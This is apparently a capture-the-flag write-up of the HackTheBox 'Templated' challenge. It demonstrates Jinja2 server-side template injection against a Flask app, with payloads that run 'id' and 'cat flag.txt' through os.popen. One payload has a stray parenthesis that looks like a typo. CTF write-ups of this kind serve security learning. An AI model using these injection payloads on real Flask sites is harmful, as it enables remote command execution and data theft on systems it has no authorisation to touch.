---
title: Templated [HackTheBox] Writeup
author: Arijit Bhowmick [sys41x4]
date: 2021-03-21 18:32:00 -0500
categories: [HackTheBox, Challenges, Web]
tags: [HackTheBox, Easy, templated, Web, Challenge, writeup, python3, python]
permalink: "/HTB/challenge/web/Templated.html"
---

[![HTB Img](/assets/htb/htb-img/htb_logo.jpeg)](http://hackthebox.eu)

### Challenge Description

![Challenge Details](/assets/htb/challenge/web/templated/img/challenge_desc.png)

```
Can you exploit this simple mistake?
```

## SOLUTION

Click on the `Start Instance` button to start the challenge.

Then you are provided with an `web address` in the form of `<ip>:<port>`. Copy it and open it in another tab or browser.
In my case it was `http://46.101.92.17:31311`

### Homepage of the Webapp :

![homepage](/assets/htb/challenge/web/templated/img/homepage.png)


The webapp shows a message 
`Site still under construction`<br>
`Proudly powered by Flask/Jinja2`<br>

Here we can see that it says that it is made with `Flask/Jinja2`.

### Searching exploits for `Flask/Jinja2`:

I have started searching exploits for `Flask/Jinja2`.
Then I came across <br>
1. <a href='https://medium.com/@nyomanpradipta120/ssti-in-flask-jinja2-20b068fdaeee' target='_blank'>ssti in flask jinja2</a><br>
2. <a href='https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2' target='_blank'>Server Side Template Injection with jinja2</a>

Here it says about the SSTI exploit.

### Test Exploit :

After modifying the provided url to {% raw %}`http://46.101.92.17:31311/{{41+41}}`{% endraw %}

I have noticed that the returned result evaluates the value.

![test_exploit](/assets/htb/challenge/web/templated/img/test_exploit_1.png)

Then I came across:
![exploit_info_gather](/assets/htb/challenge/web/templated/img/exploit_info_gather.png)

### Creating the exploit:

I have manipulated 
{% raw %}
`{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}`
{% endraw %}<br>
step by step.


![root_id_info](/assets/htb/challenge/web/templated/img/root_id_info.png)

![root_directory_content](/assets/htb/challenge/web/templated/img/root_directory_content.png)

#### EXPLOIT Code:

{% raw %}
```
http://46.101.92.17:31311/{{request.application.__globals__.__builtins__.__import__('os').popen('cat flag.txt')).read()}}
```
{% endraw %}

Format:

{% raw %}
```
http://<Web app address>/{{request.application.__globals__.__builtins__.__import__('os').popen('cat flag.txt')).read()}}
```
{% endraw %}
This is how I got the flag.

Just replace `<Web app address>` with the web address that you are provided.
In my case it was `http://46.101.92.17:31311`

![exploit](/assets/htb/challenge/web/templated/img/exploit.png)

This is how, I solved this challenge.

Thankyou, for reading my writeup :)<br>
Hope, I would see you in my next writeup.

<a href="/support/sys41x4">Support Me</a> if you want to.